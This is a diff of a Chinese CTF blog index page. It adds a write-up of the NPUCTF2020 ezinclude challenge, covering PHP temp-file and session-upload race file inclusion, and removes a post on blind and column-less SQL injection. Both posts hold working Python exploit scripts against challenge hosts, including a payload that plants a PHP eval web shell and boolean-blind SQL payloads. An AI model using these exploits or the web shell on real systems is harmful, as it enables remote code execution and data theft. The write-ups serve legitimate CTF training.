@@ -169,6 +169,97 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-重定向以及session文件包含以及php临时文件包含" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/10/07/%E9%87%8D%E5%AE%9A%E5%90%91%E4%BB%A5%E5%8F%8Asession%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%BB%A5%E5%8F%8Aphp%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="article-date">
+  	<time datetime="2021-10-06T16:00:00.000Z" itemprop="datePublished">2021-10-07</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/10/07/%E9%87%8D%E5%AE%9A%E5%90%91%E4%BB%A5%E5%8F%8Asession%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%BB%A5%E5%8F%8Aphp%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
+        重定向以及session文件包含以及php临时文件包含
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="重定向以及session文件包含以及php临时文件包含"><a href="#重定向以及session文件包含以及php临时文件包含" class="headerlink" title="重定向以及session文件包含以及php临时文件包含"></a>重定向以及session文件包含以及php临时文件包含</h1><h2 id="实例-NPUCTF2020-ezinclude"><a href="#实例-NPUCTF2020-ezinclude" class="headerlink" title="实例([NPUCTF2020]ezinclude)"></a>实例([NPUCTF2020]ezinclude)</h2><p>打开页面源码，发现有一个提示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--md5($secret.$name)===$pass --&gt;</span><br></pre></td></tr></table></figure>
+<p>然后抓包并发送，回显的包中的set-cookie字段有一个hash值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: Hash=fa25e54758d5d5c1927781a6ede89f8a</span><br></pre></td></tr></table></figure>
+<p>所以推测是pass的值，所以构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?pass=fa25e54758d5d5c1927781a6ede89f8a</span><br></pre></td></tr></table></figure>
+
+<p>发现出现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.location.href=&quot;flflflflag.php&quot;;</span><br></pre></td></tr></table></figure>
+<p>字段，当在浏览器构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/flflflflag.php</span><br></pre></td></tr></table></figure>
+<p>发现出现404页面，然后通过抓包后同样get提交</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/flflflflag.php</span><br></pre></td></tr></table></figure>
+<p>发现原来是重定向，但是通过bp抓包，可以绕过，所以抓包构造/flflflflag.php，发现是文件包含</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include($_GET[&quot;file&quot;])</span><br></pre></td></tr></table></figure>
+<p>但是不知道flag.php在哪一个文件中，但是通过目录扫描，发现有一个dir.php文件，里面有临时文件的信息，而php7有一个特性，就是当利用过滤器strip_tags来从字符串中去除HTML和PHP标记时，可以让php执行时直接出现Segment Fault（段故障），这样php的垃圾回收机制就不会继续执行，导致post提交的文件会保存在临时文件夹中不会被清除，而访问dir.php可以知道此时post上传文件的名字</p>
+<p>所以我们可以利用php伪协议来调用strip_tags过滤器，并与此同时post提交文件，致使php执行时出现Segment Fault，post提交的文件会保存在临时文件夹中<br>所以我们可以利用这个漏洞以及inculde()函数的包含来任意代码执行，因此exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from io import BytesIO</span><br><span class="line">url=&quot;http://b029c3b5-3789-4d78-9258-1ff98f05a610.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span><br><span class="line">payload=&quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line">files=&#123;</span><br><span class="line">    &quot;file&quot;:BytesIO(payload.encode())</span><br><span class="line">&#125;</span><br><span class="line">r=requests.post(url=url,files=files,allow_redirects=False)</span><br><span class="line"></span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
+<p>此时，只要访问dir.php，即可知道post提交的文件的文件名为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string(9) &quot;phpfx0Sxt&quot; </span><br></pre></td></tr></table></figure>
+<p>然后我们在构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/flflflflag.php?file=/tmp/phpfx0Sxt</span><br></pre></td></tr></table></figure>
+<p>对文件进行包含，即可执行代码，注意要抓包提交，在浏览器提交的话会重定向到404.html文件中，然后ctrl+F找flag字段即可，由于有include()函数，所以也可以尝试以下session文件包含</p>
+<p>在session中上传的数据会保存在sess_{sessid}中，然后系统会对这个文件进行检测，有害则删除，无害则留下，所以我们可以利用检测的时间，对这个文件进行包含，从而执行代码，所以我们可以写exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">import io</span><br><span class="line">import sys</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">host = &#x27;http://b65810ac-4e60-430f-a394-3ee290d0158d.node4.buuoj.cn:81/flflflflag.php&#x27;</span><br><span class="line">sessid = &#x27;feng&#x27;</span><br><span class="line"></span><br><span class="line">def POST(session):</span><br><span class="line">    while True:</span><br><span class="line">        f = io.BytesIO(b&#x27;a&#x27; * 1024 * 50)</span><br><span class="line">        session.post(</span><br><span class="line">            host,</span><br><span class="line">            data=&#123;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;:&quot;&lt;?php system(&#x27;ls /&#x27;);fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[cmd])?&gt;&#x27;);?&gt;&quot;&#125;,</span><br><span class="line">            files=&#123;&quot;file&quot;:(&#x27;a.txt&#x27;, f)&#125;,</span><br><span class="line">            cookies=&#123;&#x27;PHPSESSID&#x27;:sessid&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">def READ(session):</span><br><span class="line">    while True:</span><br><span class="line">        response = session.get(f&#x27;&#123;host&#125;?file=/tmp/sess_&#123;sessid&#125;&#x27;)</span><br><span class="line">        # print(response.text)</span><br><span class="line">        if &#x27;c4ca4238a0b923820dcc509a6f75849b&#x27; not in response.text:</span><br><span class="line">            print(&#x27;[+++]retry&#x27;)</span><br><span class="line">            print(response.text)</span><br><span class="line">        else:</span><br><span class="line">            print(response.text)</span><br><span class="line">            sys.exit(0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">with requests.session() as session:</span><br><span class="line">    t1 = threading.Thread(target=POST, args=(session, ))</span><br><span class="line">    t1.daemon = True</span><br><span class="line">    t1.start()</span><br><span class="line">    READ(session)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>其中这串代码就是我们想要执行的恶意代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&#x27;ls /&#x27;);fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[cmd])?&gt;&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+<p>而这串代码的意思是会在根目录下创建shell.php文件，且shell文件中内容为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[cmd])?&gt;</span><br></pre></td></tr></table></figure>
+<p>所以我们直接构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/shell.php</span><br><span class="line"></span><br><span class="line">post提交：cmd=phpinfo();</span><br></pre></td></tr></table></figure>
+<p>即可看到php版本信息，然后找flag字段就可以获得flag
+ </p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-flask模板注入以及arjun和talmap工具运用以及rc4加密" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -1104,85 +1195,6 @@
       
 	<div class="article-tag tagcloud">
 		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-无列名注入以及information_schema的绕过" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/09/27/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5%E4%BB%A5%E5%8F%8Ainformation_schema%E7%9A%84%E7%BB%95%E8%BF%87/" class="article-date">
-  	<time datetime="2021-09-26T16:00:00.000Z" itemprop="datePublished">2021-09-27</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/09/27/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5%E4%BB%A5%E5%8F%8Ainformation_schema%E7%9A%84%E7%BB%95%E8%BF%87/">
-        无列名注入以及information_schema的绕过
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="无列名注入以及infomation-schema的绕过"><a href="#无列名注入以及infomation-schema的绕过" class="headerlink" title="无列名注入以及infomation_schema的绕过"></a>无列名注入以及infomation_schema的绕过</h1><p>我们打开页面，发现是一个简陋的信息查询，然后尝试sql注入闭合测试</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&quot;#</span><br></pre></td></tr></table></figure>
-<p>发现有回显</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQL Injection Checked.</span><br></pre></td></tr></table></figure>
-<p>发现是sql注入漏洞，且如果随意输入数据进行查询，发现回显</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bool(false)</span><br></pre></td></tr></table></figure>
-<p>所以可以使用bool盲注，但是经过fuzz，发现if被过滤了，且or也被严格过滤，所以information_schema也被过滤，因此根据经验，可以使用</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sys.schema_table_statistics_with_buffer</span><br></pre></td></tr></table></figure>
-<p>来代替information_schema，但是它只可以查询table（表）,不可以查询列名(字段)，同时通过抓包，可以知道如果出现错误的话，会返回V&amp;N，如果正确的话，返回Nu1L，所以我们可以用以下exp</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &#x27;http://bfd71058-3cf0-4e87-8731-8935a651f051.node3.buuoj.cn/&#x27;</span><br><span class="line">payload = &#x27;2||ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()),&#123;&#125;,1))=&#123;&#125;&#x27;</span><br><span class="line">result = &#x27;&#x27;</span><br><span class="line">for j in range(1,500):</span><br><span class="line">    for i in range(32, 127):</span><br><span class="line">        py = payload.format(j,i)</span><br><span class="line">        post_data = &#123;&#x27;id&#x27;: py&#125;</span><br><span class="line">        re = requests.post(url, data=post_data)</span><br><span class="line">        if &#x27;Nu1L&#x27; in re.text:</span><br><span class="line">            result += chr(i)</span><br><span class="line">            print(result)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
-<p>可以爆出两个表名</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">users233333333333333,f1ag_1s_h3r3_hhhhh</span><br></pre></td></tr></table></figure>
-<p>但是由于我们无法知道列名，所以我们可以使用无列名注入</p>
-<h2 id="无列名注入的原理"><a href="#无列名注入的原理" class="headerlink" title="无列名注入的原理"></a>无列名注入的原理</h2><p>例子</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select(select &#x27;b&#x27;)&gt;(select &#x27;c&#x27;);</span><br></pre></td></tr></table></figure>
-<p>无列名注入使用了ascii位偏移，就是比较两个字符串的大小，即各取两个字符串的首字符ascii码来比较，如果相等则选取下一个字符进行比较，如果不等式成立的话返回1，如果不等式不成立的话返回0，只比较一次</p>
-<p>但是我们不知道有多少个字段，flag在哪一个字段里，所以我们可以先</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1^((select 1,1)&gt;(select * from flag_ls_h3r3_hhhhh))^1</span><br></pre></td></tr></table></figure>
-<p>来测试有几个字段和flag在哪个字段里，通过测试发现，存在两个字段，flag在第二个字段里，所以我们可以使用exp</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &#x27;http://bfd71058-3cf0-4e87-8731-8935a651f051.node3.buuoj.cn/&#x27;</span><br><span class="line">def add(flag):</span><br><span class="line">    res = &#x27;&#x27;</span><br><span class="line">    res += flag</span><br><span class="line">    return res</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in range(1,200):</span><br><span class="line">    for char in range(32, 127):</span><br><span class="line">        hexchar = add(flag + chr(char))</span><br><span class="line">        payload = &#x27;2||((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#x27;.format(hexchar)</span><br><span class="line">        #print(payload)</span><br><span class="line">        data = &#123;&#x27;id&#x27;:payload&#125;</span><br><span class="line">        r = requests.post(url=url, data=data)</span><br><span class="line">        text = r.text</span><br><span class="line">        if &#x27;Nu1L&#x27; in r.text:</span><br><span class="line">            flag += chr(char-1)</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
-<p>来爆出flag出来，但是flag都是小写字母，所以可以使用c语言来转化为小写</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int main()&#123;</span><br><span class="line">	int i=0;</span><br><span class="line">	char a[]=&quot;FLAG&#123;2A2D6335-F1D1-4E6E-8A77-135E0DFC5149&#125;&quot;;</span><br><span class="line">	while(a[i]!=&#x27;\0&#x27;)&#123;</span><br><span class="line">		if(a[i]&gt;=65 &amp;&amp; a[i]&lt;=90)&#123;</span><br><span class="line">			a[i]+=32;</span><br><span class="line">		&#125;</span><br><span class="line">		cout&lt;&lt;a[i];</span><br><span class="line">		i++;</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li></ul>
 	</div>
 
       
